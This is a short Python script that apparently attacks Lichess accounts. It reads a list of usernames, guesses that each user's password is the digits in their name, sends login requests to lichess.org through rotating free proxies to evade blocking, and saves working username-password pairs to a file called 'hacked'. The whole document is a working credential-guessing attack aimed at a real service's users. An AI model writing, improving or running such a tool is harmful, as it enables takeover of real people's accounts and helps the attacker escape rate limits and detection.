import requests, time, json

def s2(user, password):
    r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=2000&country=all&ssl=all&anonymity=all")
    proxy_list = r.text.split("\r\n")
    for p in proxy_list:
        proxies = {"http" : "http://" + p, "https" : "http://" + p}
        try:
          n = requests.post("https://lichess.org/login", data = {"username" : user.upper(), "password" : password}, headers={"X-Requested-With" : "XMLHttpRequest", "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 GLS/100.10.9939.100"}, proxies=proxies, timeout=2)
          return n
        except: time.sleep(0.2)
    return 0


def getNumericPart(string):
    res = ''
    for i in string:
        if (i.isnumeric()): res = res + i
    return res

def hack(user,i):
#    username = json.loads(user).get("name")
    username = user.split("{'id': '")[1].split("'")[0]
    passwords = [getNumericPart(username)]
    if (len(passwords[0]) != 8): return
    print(username,i)
    for password in passwords:
        if (not password): continue
        if (len(password) < 4): continue
        r = s2(username, password)
        print(r.status_code, username, password)
        open("statteam2","w").write(r.text)
        if (r.status_code == 200) or (r.text.find("this network") > -1): open("hacked", "a").write(username + " " + password + "\n")
        time.sleep(5)

i = 1
for user in open("_userlist").read().split("\n"):
     hack(user,i)
     i+=1
     open("stateam", "w").write(user)
